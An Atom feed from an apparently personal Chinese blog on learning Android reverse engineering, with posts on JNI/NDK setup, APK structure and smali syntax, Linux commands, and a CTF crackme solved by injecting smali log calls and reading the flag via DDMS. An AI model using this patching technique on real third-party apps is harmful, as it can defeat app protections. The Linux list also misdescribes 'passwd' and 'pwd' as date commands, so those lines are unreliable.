<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ESE&#39;s Note</title>
  
  <subtitle>阅览室</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-03-14T09:18:48.101Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android_jni_编程</title>
    <link href="http://yoursite.com/2018/03/14/android_jni/"/>
    <id>http://yoursite.com/2018/03/14/android_jni/</id>
    <published>2018-03-14T02:12:23.399Z</published>
    <updated>2018-03-14T09:18:48.101Z</updated>
    
    <content type="html"><![CDATA[<p>Android_jni是将核心加密算法写在.so(动态库)中，不容易被反编译逆向出算法。所以需要去学习了解一下。<br><a id="more"></a></p><h1 id="1、什么是JNI"><a href="#1、什么是JNI" class="headerlink" title="1、什么是JNI"></a>1、什么是JNI</h1><p>JNI(Java Native Interface):java本地开发接口JNI是一个协议，这个协议用来沟通java代码和外部的本地代码(c/c++)外部的c/c++代码也可以调用java代码。效率上 C/C++是本地语言，比java更高效代码移植，如果之前用C语言开发过模块，可以复用已经存在的c代码java反编译比C语言容易，一般加密算法都是用C语言编写，不容易被反编译</p><h1 id="2、交叉编译"><a href="#2、交叉编译" class="headerlink" title="2、交叉编译"></a>2、交叉编译</h1><p>交叉编译即在一个平台，编译出另一个平台能够执行的二进制代码。原理:即在一个平台上，模拟其他平台的特性。</p><h2 id="1、常见的交叉编译工具"><a href="#1、常见的交叉编译工具" class="headerlink" title="1、常见的交叉编译工具"></a>1、常见的交叉编译工具</h2><p>NDK(Native Development Kit): 开发JNI必备工具，就是模拟其他平台特性类编译代码的工具<br>CDT(C/C++ Development Tools): 是Eclipse开发C语言的一个插件，高亮显示C语言的语法<br>Cygwin: 一个Windows平台的Unix模拟器</p><h2 id="2、NDK的目录结构"><a href="#2、NDK的目录结构" class="headerlink" title="2、NDK的目录结构"></a>2、NDK的目录结构</h2><p>build/tools：linux的批处理文件<br>platforms：编译c代码需要使用的头文件和类库<br>prebuilt：预编译使用的二进制可执行文件<br>sample：jni的使用例子<br>source：ndk的源码<br>toolchains：工具链<br>ndk-build.cmd:编译打包c代码的一个指令，需要配置系统环境变量</p><h1 id="3、Android-Studio之NDK安装"><a href="#3、Android-Studio之NDK安装" class="headerlink" title="3、Android_Studio之NDK安装"></a>3、Android_Studio之NDK安装</h1><p>搭建ndk环境<br>1、路径： File-&gt;Setting-&gt;看图<br><img src="https://i.imgur.com/kbz3yQ3.png" alt=""><br>(这个要等待一段时间)<br>2、新建项目<br><img src="https://i.imgur.com/TtbtwFr.png" alt=""><br>然后一直默认下一步，接着自动生成一个demo。<br>运行结果:<br><img src="https://i.imgur.com/U1eGcLP.png" alt=""><br>将apk改成zip<br>发现.so文件<br><img src="https://i.imgur.com/Y91D8OW.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Android_jni是将核心加密算法写在.so(动态库)中，不容易被反编译逆向出算法。所以需要去学习了解一下。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android_之_DDMS_与_修改smali混用</title>
    <link href="http://yoursite.com/2018/03/12/android_re_3_ddms/"/>
    <id>http://yoursite.com/2018/03/12/android_re_3_ddms/</id>
    <published>2018-03-12T08:12:47.537Z</published>
    <updated>2018-03-12T14:46:55.257Z</updated>
    
    <content type="html"><![CDATA[<p>学习了这么久，实践才是检测真理的唯一真理呀(今天看见两个国外贼漂亮的小姐姐)<br><a id="more"></a></p><h2 id="1、题目"><a href="#1、题目" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="https://pan.baidu.com/s/1YOXnJYyv2QWfWnP7Jwd2JQ" target="_blank" rel="external">https://pan.baidu.com/s/1YOXnJYyv2QWfWnP7Jwd2JQ</a> 密码：fsvl<br>用工具android killer打开apk,先在编译成apk,发现程序能正常运行，并没有apk验证,那么可以改smali代码啦，也许不需要。<br><img src="https://i.imgur.com/ugFIzub.png" alt=""><br>接下来看simple.check()函数啦，然后你就会发现，这些人怎么有耐心写这么长的代码(头大)。经过分析可以发现类中成员变量A[]就是存储用户输入的字符串，B[]就是存储flag的<br><img src="https://i.imgur.com/4hqUtND.png" alt=""><br>可以直接使用“smali 代码注入”，插入LOG，直接打印出计算后的值<br>1、构造打印函数<br><img src="https://i.imgur.com/bR8PciG.png" alt=""><br>2、插入打印位置<br><img src="https://i.imgur.com/EA9fy2Z.png" alt=""><br>接着就是反编译成apk,然后用模拟器打开，接着ddms动态<br>3、ddms动态调试<br><img src="https://i.imgur.com/oUvXMAu.png" alt=""></p><p>师傅的智慧是无线的，羡慕羡慕。今天先水水(其实环境都配置好久才复现的，想哭)<br>参考:<br><a href="https://www.ichunqiu.com/writeup/detail/35" target="_blank" rel="external">https://www.ichunqiu.com/writeup/detail/35</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习了这么久，实践才是检测真理的唯一真理呀(今天看见两个国外贼漂亮的小姐姐)&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android与Apk的文件结构</title>
    <link href="http://yoursite.com/2018/03/11/android_construction/"/>
    <id>http://yoursite.com/2018/03/11/android_construction/</id>
    <published>2018-03-11T03:03:06.688Z</published>
    <updated>2018-03-11T11:33:08.054Z</updated>
    
    <content type="html"><![CDATA[<p>Android与Apk的文件结构在学习逆向很重要的一步。随便记录一下smali语法<br><a id="more"></a></p><h1 id="1、Android"><a href="#1、Android" class="headerlink" title="1、Android"></a>1、Android</h1><p>Android 是google公司针对手机开发的一个平台，并公布了其中大部分代码，其大部分应用程序都是用JAVA开发的。</p><h2 id="系统结构"><a href="#系统结构" class="headerlink" title="系统结构"></a>系统结构</h2><p>android的系统架构和其操作系统一样，采用了分层的架构。从架构图看，android分为四个层，从高层到低层分别是应用程序层、应用程序框架层、系统运行库层和linux核心层。<br><img src="https://i.imgur.com/gYQwOom.png" alt=""><br>从而看出liunx是很重要的，蓝色的代表java程序，黄色的代码为运行JAVA程序而实现的虚拟机，绿色部分为C/C++语言编写的程序库，红色的代码内核(linux内核+drvier)。</p><h3 id="1、应用程序"><a href="#1、应用程序" class="headerlink" title="1、应用程序"></a>1、应用程序</h3><p>Android会同一系列核心应用程序包一起发布，应用程序基本都是使用JAVA语言编写的。</p><h3 id="2、应用程序框架"><a href="#2、应用程序框架" class="headerlink" title="2、应用程序框架"></a>2、应用程序框架</h3><p>开发人员也可以完全访问核心应用程序所使用的API 框架，该应用程序的架构设计简化了组件的重用。</p><h3 id="3、系统运行库"><a href="#3、系统运行库" class="headerlink" title="3、系统运行库"></a>3、系统运行库</h3><p>(1)、程序库<br>Android 包含一些C/C++库，这些库能被Android系统中不同的组件使用。它们通过 Android 应用程序框架为开发者提供服务。其实Android并非讲所有的设备驱动都放在linux内核里面，而是实现在userspace空间，这么做的主要原因是GPL协议，Linux是遵循该 协议来发布的，也就意味着对 linux内核的任何修改，都必须发布其源代码。而现在这么做就可以避开而无需发布其源代码，毕竟它是用来赚钱的。<br>(2)Android 运行库<br>Android 包括了一个核心库，该核心库提供了JAVA编程语言核心库的大多数功能。每一个Android应用程序都在它自己的进程中运 行，都拥有一个独立的Dalvik虚拟 机实例。Dalvik被设计成一个设备可以同时高效地运行多个虚拟系统。 Dalvik虚拟机执行（.dex）的Dalvik可执行文件，该格式文件针对小内存使用做了优化。同时Dalvik虚拟机依赖于linux内核的一些功能，比如线程机制和底层内存管理机制。</p><h3 id="4、Linux内核"><a href="#4、Linux内核" class="headerlink" title="4、Linux内核"></a>4、Linux内核</h3><p>Android 的核心系统服务依赖于 Linux 2.6 内核，如安全性，内存管理，进程管理， 网络协议栈和驱动模型。 Linux 内核也同时作为硬件和软件栈之间的抽象层。</p><h1 id="2、Apk的文件结构"><a href="#2、Apk的文件结构" class="headerlink" title="2、Apk的文件结构"></a>2、Apk的文件结构</h1><p>APK就是一个zip压缩包，解开这个APK包我们可以看到以下的结构：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">META-INF：签名文件</div><div class="line">res：资源文件</div><div class="line">AndroidManifest.xml：android 配置文件</div><div class="line">classes.dex：java代码编译后产生的类似字节码的文件（dalvik 字节码）</div><div class="line">resources.arsc：配置文件</div><div class="line">其他文件：诸如assets等，或者lib（native so 代码）等目录</div></pre></td></tr></table></figure></p><p>apk的核心逻辑主要在 classes.dex(代码主要存在的文件)，有些代码会在.so(动态链接库)文件 [最头痛的文件].</p><h1 id="3、Smali语法"><a href="#3、Smali语法" class="headerlink" title="3、Smali语法"></a>3、Smali语法</h1><h2 id="1、函数"><a href="#1、函数" class="headerlink" title="1、函数"></a>1、函数</h2><h3 id="函数的定义一般为："><a href="#函数的定义一般为：" class="headerlink" title="函数的定义一般为："></a>函数的定义一般为：</h3><p>Func-Name (Para-Type1Para-Type2Para-Type3…)Return-Type<br>注意参数与参数之间没有任何分隔符<br>1、check ()V         —-&gt; void check()<br>2、check (III)Z      —-&gt; boolean check(int,int,int)<br>3、check (Z[I[Ijava/lang/String)java/lang/String;   —-&gt; String check(boolean,int[],int[],String)</p><p>而函数又分为direct method和virtual method。direct method就是private函数，其余的public和protected函数都属于virtual method。</p><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>格式：.method + 访问修饰符 + 方法名(参数表) + 返回值类型<br>.method // 方法的开始<br>.end method // 方法结束</p><p>在调用函数时，有invoke-direct，invoke-virtual，另外还有invoke-static、invoke-super以及invoke-interface等几种不同的指令。<br>对象 -&gt; 方法名(参数类型)返回值<br>invoke-virtual 非静态方法调用<br>invoke-static  静态方法调用<br>invoke-direct  构造方法调用？<br>invoke-super   调用父类方法<br>invoke-interface 调用接口<br>（1）、invoke-static：顾名思义就是调用static函数的，因为是static函数，所以比起其他调用少一个参数，例如：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span>-<span class="built_in">string</span> v0, <span class="string">"fmodex"</span>  </div><div class="line">invoke-<span class="keyword">static</span> &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V</div></pre></td></tr></table></figure></p><p> 这个是调用static void System.loadLibrary(String)来加载NDK编译的so库用的方法，同样也是这里v0就是参数”fmodex”了。<br>（2）、invoke-virtual：用于调用protected或public函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sget-object v0, Lcom/disney/WMW/WMWActivity;-&gt;shareHandler:Landroid/os/Handler;</div><div class="line">invoke-<span class="keyword">virtual</span> &#123;v0, v3&#125;, Landroid/os/Handler;-&gt;removeCallbacksAndMessages(Ljava/lang/Object;)V</div></pre></td></tr></table></figure></p><p>v0是shareHandler:Landroid/os/Handler，v3是传递给removeCallbackAndMessage方法的Ljava/lang/Object参数</p><p>调用返回结果:用到move-result（返回基本数据类型）和move-result-object（返回对象）指令</p><h3 id="smali中函数实体分析"><a href="#smali中函数实体分析" class="headerlink" title="smali中函数实体分析"></a>smali中函数实体分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">.<span class="function">method <span class="keyword">protected</span> <span class="title">onDestroy</span><span class="params">()</span>V  </span></div><div class="line">    .locals 0  </div><div class="line">       </div><div class="line">    .prologue  </div><div class="line">    .line <span class="number">277</span>  </div><div class="line">    invoke-super &#123;p0&#125;, Lcom/disney/common/BaseActivity;-&gt;onDestroy()V  </div><div class="line">       </div><div class="line">    .line <span class="number">279</span>  </div><div class="line">    <span class="keyword">return</span>-<span class="keyword">void</span>  </div><div class="line">.end method</div></pre></td></tr></table></figure><p>.local 0，这句话很重要，标明了你在这个函数中最少要用到的本地寄存器的个数。在这里，由于只需要调用一个父类的onDestroy()处理，所以只需要用到p0，所以使用到的本地寄存器数为0。如果不清楚这个规则，很容易在植入代码后忘记修改.local 的值，那么回编译后运行时将会得到一个VerifyError错误，而且极难发现问题所在。</p><h2 id="2、语法"><a href="#2、语法" class="headerlink" title="2、语法"></a>2、语法</h2><h3 id="if与switch判断语句"><a href="#if与switch判断语句" class="headerlink" title="if与switch判断语句"></a>if与switch判断语句</h3><p>if判断一共有12条指令：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>-eq vA, VB, cond_** 如果vA等于vB则跳转到cond_**。相当于<span class="keyword">if</span> (vA==vB)</div><div class="line"><span class="keyword">if</span>-ne vA, VB, cond_** 如果vA不等于vB则跳转到cond_**。相当于<span class="keyword">if</span> (vA!=vB)</div><div class="line"><span class="keyword">if</span>-lt vA, VB, cond_** 如果vA小于vB则跳转到cond_**。相当于<span class="keyword">if</span> (vA&lt;vB)</div><div class="line"><span class="keyword">if</span>-le vA, VB, cond_** 如果vA小于等于vB则跳转到cond_**。相当于<span class="keyword">if</span> (vA&lt;=vB)</div><div class="line"><span class="keyword">if</span>-gt vA, VB, cond_** 如果vA大于vB则跳转到cond_**。相当于<span class="keyword">if</span> (vA&gt;vB)</div><div class="line"><span class="keyword">if</span>-ge vA, VB, cond_** 如果vA大于等于vB则跳转到cond_**。相当于<span class="keyword">if</span> (vA&gt;=vB)</div><div class="line"></div><div class="line"><span class="keyword">if</span>-eqz vA, :cond_** 如果vA等于<span class="number">0</span>则跳转到:cond_** 相当于<span class="keyword">if</span> (VA==<span class="number">0</span>)</div><div class="line"><span class="keyword">if</span>-nez vA, :cond_** 如果vA不等于<span class="number">0</span>则跳转到:cond_**相当于<span class="keyword">if</span> (VA!=<span class="number">0</span>)</div><div class="line"><span class="keyword">if</span>-ltz vA, :cond_** 如果vA小于<span class="number">0</span>则跳转到:cond_**相当于<span class="keyword">if</span> (VA&lt;<span class="number">0</span>)</div><div class="line"><span class="keyword">if</span>-lez vA, :cond_** 如果vA小于等于<span class="number">0</span>则跳转到:cond_**相当于<span class="keyword">if</span> (VA&lt;=<span class="number">0</span>)</div><div class="line"><span class="keyword">if</span>-gtz vA, :cond_** 如果vA大于<span class="number">0</span>则跳转到:cond_**相当于<span class="keyword">if</span> (VA&gt;<span class="number">0</span>)</div><div class="line"><span class="keyword">if</span>-gez vA, :cond_** 如果vA大于等于<span class="number">0</span>则跳转到:cond_**相当于<span class="keyword">if</span> (VA&gt;=<span class="number">0</span>)</div></pre></td></tr></table></figure></p><p>Switch语句<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">整形顺序结构<span class="keyword">switch</span>(<span class="keyword">int</span>)</div><div class="line">    :pswitch_data_0</div><div class="line">    .packed-<span class="keyword">switch</span> <span class="number">0x0</span></div><div class="line">        :pswitch_0</div><div class="line">        :pswitch_1</div><div class="line">.end packed-<span class="keyword">switch</span></div><div class="line">整形非顺序结构<span class="keyword">switch</span>(<span class="keyword">int</span>)</div><div class="line">    :sswitch_data_0</div><div class="line">    .sparse-<span class="keyword">switch</span></div><div class="line">        <span class="number">0x0</span> -&gt; :sswitch_0</div><div class="line">        <span class="number">0x1</span> -&gt; :sswitch_1</div><div class="line">        <span class="number">0xa</span> -&gt; :sswitch_2</div><div class="line">.end sparse-<span class="keyword">switch</span></div><div class="line"><span class="keyword">switch</span>(String)</div><div class="line">    :pswitch_data_0</div><div class="line">    .packed-<span class="keyword">switch</span> <span class="number">0x41</span></div><div class="line">        :pswitch_0</div><div class="line">        :pswitch_1</div><div class="line">    .end packed-<span class="keyword">switch</span></div><div class="line"></div><div class="line">    :pswitch_data_1</div><div class="line">    .packed-<span class="keyword">switch</span> <span class="number">0x0</span></div><div class="line">        :pswitch_2</div><div class="line">        :pswitch_3</div><div class="line">    .end packed-<span class="keyword">switch</span></div></pre></td></tr></table></figure></p><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">.<span class="function">method <span class="keyword">public</span> <span class="title">statementFor</span><span class="params">()</span>Z</span></div><div class="line">    .locals 4</div><div class="line">    .prologue</div><div class="line">    .line <span class="number">17</span></div><div class="line">    <span class="keyword">const</span>/<span class="number">4</span> v0, <span class="number">0x0</span></div><div class="line">    .local v0, <span class="string">"a"</span>:I</div><div class="line">    :goto_0</div><div class="line">    <span class="keyword">const</span>/<span class="number">16</span> v1, <span class="number">0x64</span></div><div class="line">    <span class="keyword">if</span>-ge v0, v1, :cond_0 <span class="comment">// 结束循环条件</span></div><div class="line">    .line <span class="number">18</span></div><div class="line">    <span class="keyword">const</span>-<span class="built_in">string</span> v1, <span class="string">"StateLoop"</span></div><div class="line">    <span class="keyword">new</span>-instance v2, Ljava/lang/StringBuilder;</div><div class="line">    invoke-direct &#123;v2&#125;, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V</div><div class="line">    <span class="keyword">const</span>-<span class="built_in">string</span> v3, <span class="string">""</span></div><div class="line">    invoke-<span class="keyword">virtual</span> &#123;v2, v3&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</div><div class="line">    move-result-object v2</div><div class="line">    invoke-<span class="keyword">virtual</span> &#123;v2, v0&#125;, Ljava/lang/StringBuilder;-&gt;append(I)Ljava/lang/StringBuilder;</div><div class="line">    move-result-object v2</div><div class="line">    invoke-<span class="keyword">virtual</span> &#123;v2&#125;, Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String;</div><div class="line">    move-result-object v</div><div class="line">    invoke-<span class="keyword">static</span> &#123;v1, v2&#125;, Landroid/util/Log;-&gt;d(Ljava/lang/String;Ljava/lang/String;)I</div><div class="line">    .line <span class="number">17</span></div><div class="line">    add-<span class="keyword">int</span>/lit8 v0, v0, <span class="number">0x1</span></div><div class="line">    <span class="keyword">goto</span> :goto_0 <span class="comment">// 通过goto实现循环</span></div><div class="line">    .line <span class="number">20</span></div><div class="line">    :cond_0</div><div class="line">    <span class="keyword">const</span>/<span class="number">4</span> v1, <span class="number">0x0</span></div><div class="line">    <span class="keyword">return</span> v1</div><div class="line">.end method</div><div class="line"><span class="keyword">for</span>/foreach循环，<span class="keyword">while</span>/<span class="keyword">do</span>-<span class="keyword">while</span> 几种循环结构smali语法均通过<span class="keyword">goto</span>实现，内部嵌入<span class="keyword">if</span>-xxx 实现跳出循环。</div></pre></td></tr></table></figure><h3 id="try-catch语句"><a href="#try-catch语句" class="headerlink" title="try/catch语句"></a>try/catch语句</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># virtual methods</span></div><div class="line">.<span class="function">method <span class="keyword">public</span> <span class="title">statementTry</span><span class="params">()</span>Z</span></div><div class="line">    .locals 4</div><div class="line">    .prologue</div><div class="line">    .line <span class="number">14</span></div><div class="line">    <span class="keyword">const</span>-wide/<span class="number">16</span> v2, <span class="number">0x3e8</span></div><div class="line">    :try_start_0</div><div class="line">    invoke-<span class="keyword">static</span> &#123;v2, v3&#125;, Ljava/lang/Thread;-&gt;sleep(J)V</div><div class="line">    :try_end_0</div><div class="line">    .<span class="keyword">catch</span> Ljava/lang/InterruptedException; &#123;:try_start_0 .. :try_end_0&#125; :catch_0</div><div class="line">    .line <span class="number">18</span></div><div class="line">    :goto_0</div><div class="line">    <span class="keyword">const</span>/<span class="number">4</span> v1, <span class="number">0x1</span></div><div class="line">    <span class="keyword">return</span> v1</div><div class="line">    .line <span class="number">15</span></div><div class="line">    :catch_0</div><div class="line">    move-exception v0</div><div class="line">    .line <span class="number">16</span></div><div class="line">    .local v0, <span class="string">"e"</span>:Ljava/lang/InterruptedException;</div><div class="line">    invoke-<span class="keyword">virtual</span> &#123;v0&#125;, Ljava/lang/InterruptedException;-&gt;printStackTrace()V</div><div class="line">    <span class="keyword">goto</span> :goto_0</div><div class="line">.end method</div></pre></td></tr></table></figure><p>Android参考:<br><a href="http://blog.csdn.net/spy19881201/article/details/5775484" target="_blank" rel="external">http://blog.csdn.net/spy19881201/article/details/5775484</a><br>samli参考:<br><a href="http://blog.csdn.net/chenrunhua/article/details/41250613" target="_blank" rel="external">http://blog.csdn.net/chenrunhua/article/details/41250613</a><br><a href="https://www.cnblogs.com/zhen-android/p/7259434.html" target="_blank" rel="external">https://www.cnblogs.com/zhen-android/p/7259434.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Android与Apk的文件结构在学习逆向很重要的一步。随便记录一下smali语法&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android_之_liunx</title>
    <link href="http://yoursite.com/2018/03/09/android_re_2/"/>
    <id>http://yoursite.com/2018/03/09/android_re_2/</id>
    <published>2018-03-09T00:22:13.808Z</published>
    <updated>2018-03-09T00:59:23.678Z</updated>
    
    <content type="html"><![CDATA[<p>由于Android是基于liunx内核的，今天整理一下liunx的有关信息<br><a id="more"></a></p><h2 id="1、什么是Liunx"><a href="#1、什么是Liunx" class="headerlink" title="1、什么是Liunx"></a>1、什么是Liunx</h2><p>Linux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的UNIX工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统，诞生于1991年10月5日。</p><h2 id="2、Liunx的特点"><a href="#2、Liunx的特点" class="headerlink" title="2、Liunx的特点"></a>2、Liunx的特点</h2><p>1、一切都是文件(就是系统中的所有都归结为一个文件，包括命令、硬件和软件设备、操作系统、进程等等对于操作系统内核而言，都被视为拥有各自特性或类型的文件)。<br>2、Linux在内存管理优势：Windows是只在需要内存时，才为应用程序分配内存；Linux 无论物理内存有多大，都将其充份利用。<br>3、不需要整理磁盘碎片<br>4、每个软件都有确定的用途</p><h2 id="3、Liunx文件"><a href="#3、Liunx文件" class="headerlink" title="3、Liunx文件"></a>3、Liunx文件</h2><h3 id="1、文件系统"><a href="#1、文件系统" class="headerlink" title="1、文件系统"></a>1、文件系统</h3><p>1、普通文件:就是一般存取的文件，由ls -al显示出来的属性中，第一个属性为 [-]，例如 [-rwxrwxrwx]。<br>2、目录文件（directory）:就是目录，第一个属性为 [d]，例如 [drwxrwxrwx]。<br>3、连接文件（link）:类似Windows下面的快捷方式。第一个属性为 [l]，例如 [lrwxrwxrwx]。<br>4、设备与设备文件（device）:系统外设及存储等相关的一些文件，通常都集中在 /dev目录。通常又分为两种：块设备文件：就是存储数据以供系统存取的接口设备，简单而言就是硬盘。例如一号硬盘的代码是 /dev/hda1等文件。第一个属性为 [b]。字符设备文件：即串行端口的接口设备，例如键盘、鼠标等等。第一个属性为 [c]<br>5、套接字（sockets）：这类文件通常用在网络数据连接。可以启动一个程序来监听客户端的要求，客户端就可以通过套接字来进行数据通信。第一个属性为 [s]，最常在 /var/run目录中看到这种文件类型。<br>6、管道（FIFO,pipe）：FIFO也是一种特殊的文件类型，它主要的目的是，解决多个程序同时存取一个文件所造成的错误。FIFO是first-in-first-out（先进先出）的缩写。第一个属性为 [p]。[</p><h3 id="2、文件结构"><a href="#2、文件结构" class="headerlink" title="2、文件结构"></a>2、文件结构</h3><p>/：根目录，所有的目录、文件、设备都在/之下，/就是Linux文件系统的组织者，也是最上级的领导者。<br>根目录下一层一般有基础的15个目录:bin,boot,dev,etc,lib,media,mnt,opt,root,sbin,srv,tmp,usr,var<br><img src="https://i.imgur.com/5WK2k5M.png" alt=""><br>/etc：etc这个目录是linux系统中最重要的目录之一。在这个目录下存放了系统管理时要用到的各种配置文件和子目录。要用到的网络配置文件，文件系统，x系统配置文件，设备配置信息，设置用户信息等都在这个目录下。<br>/var：这个目录的内容是经常变动的，看名字就知道，可以理解为vary的缩写，/var下有/var/log 这是用来存放系统日志的目录。/var/ www目录是定义Apache服务器站点存放目录；/var/lib 用来存放一些库文件，比如MySQL的，以及MySQL数据库的的存放地。<br>/mnt：这个目录一般是用于存放挂载储存设备的挂载目录的，比如有cdrom等目录。可以参看/etc/fstab的定义<br>/usr/local：这里主要存放那些手动安装的软件，即不是通过“新立得”或apt-get安装的软件。它和/usr目录具有相类似的目录结构。让软件包管理器来管理/usr目录，而把自定义的脚本（scripts)放到/usr/local目录下面、。</p><h3 id="3、文件操作"><a href="#3、文件操作" class="headerlink" title="3、文件操作"></a>3、文件操作</h3><p>cd-切换；<br>pwd-显示当前目录；<br>mkdir-新建一个新目录；<br>rmdir-删除一个空目录；<br>ls-查看文件目录；<br>cp-复制文件；<br>rm-删除文件；<br>mv-移动文件</p><h2 id="4、Liunx常用命令及技巧"><a href="#4、Liunx常用命令及技巧" class="headerlink" title="4、Liunx常用命令及技巧"></a>4、Liunx常用命令及技巧</h2><p>一。 通用命令:</p><ol><li>date ：print or set the system date and time<br>　　2. stty -a: 可以查看或者打印控制字符(Ctrl-C, Ctrl-D, Ctrl-Z等)<br>　　3. passwd: print or set the system date and time (用passwd -h查看)<br>　　4. logout, login: 登录shell的登录和注销命令<br>　　5. pwd: print or set the system date and time<br>　　6. more, less, head tail: 显示或部分显示文件内容.<br>　　7. lp/lpstat/cancel, lpr/lpq/lprm: 打印文件.<br>　　8. 更改文件权限： chmod u+x…<br>　　9. 删除非空目录：rm -fr dir<br>　　10.拷贝目录： cp -R dir<br>　　11. fg jobid :可以将一个后台进程放到前台。<br>　　Ctrl-z 可以将前台进程挂起(suspend), 然后可以用bg jobid 让其到后台运行。<br>　　job &amp; 可以直接让job直接在后台运行。<br>　　12. kill 的作用: send a signal to a process. eg: kill -9 发送的是SIG_KILL信号。。。 具体发送什么信号 可以通过 man kill 查看。<br>　　13. ps 的用法， ps -e 或 ps -o pid,ppid,session,tpgid, comm (其中session显示的sessionid, tpgid显示前台进程组id, comm显示命令名称。)<br>二 .ubuntu常用命令:</li><li>dpkg: package manager for Debian<br>　　<em> 安装： dpkg -i package　　</em> 卸载： dpkg -r package<br>　　<em> 卸载并删除配置文件: dpkg -P |–purge package　　</em> 如果安装一个包时。说依赖某些库。 可以先 apt-get install somelib…<br>　　<em> 查看软件包安装内容 :dpkg -L package　　</em> 查看文件由哪个软件包提供: dpkg -S filename<br>　　* 另外 dpkg还有 dselect和aptitude 两个frontend.</li><li>apt<br>　　<em> 安装: apt-get install packs　　</em> apt-get update : 更新源<br>　　<em> apt-get upgrade: 升级系统。　　</em> apt-get dist-upgrade: 智能升级。安装新软件包,删除废弃的软件包<br>　　<em> apt-get -f install ： -f == –fix broken 修复依赖　　</em> apt-get autoremove: 自动删除无用的软件<br>　　<em> apt-get remove packages :删除软件　　</em> apt-get remove package –purge 删除包并清除配置文件<br>　　<em> 清除所以删除包的残余配置文件: dpkg -l |grep ^rc|awk ‘{print $2}’ |tr [“/n”] [“ “]|sudo xargs dpkg -P　　</em> 安装软件时候包的临时存放目录 : /var/cache/apt/archives<br>　　<em> 清除该目录: apt-get clean　　</em> 清除该目录的旧版本的软件缓存: apt-get autoclean<br>　　<em> 查询软件some的依赖包： apt-cache depends some　　</em> 查询软件some被哪些包依赖: apt-get rdepends some<br>　　<em> 搜索软件: apt-cache search name|regexp　　</em> 查看软件包的作用：apt-cache show package<br>　　<em> 查看一个软件的编译依赖库: apt-cache showsrc packagename|grep Build-Depends　　</em> 下载软件的源代码 : apt-get source packagename (注: sources.list 中应该有 deb-src 源)<br>　　<em> 安装软件包源码的同时, 安装其编译环境 :apt-get build-dep packagename (有deb-src源)　　</em> 如何将本地光盘加入安装源列表: apt-cdrom add</li><li>系统命令:<br>　　<em> 查看内核版本： uname -a　　</em> 查看ubuntu 版本: cat /etc/issue<br>　　<em> 查看网卡状态 : ethtool eth0　　</em> 查看内存,cpu的信息： cat /proc/meminfo ; cat /proc/cpuinfo<br>　　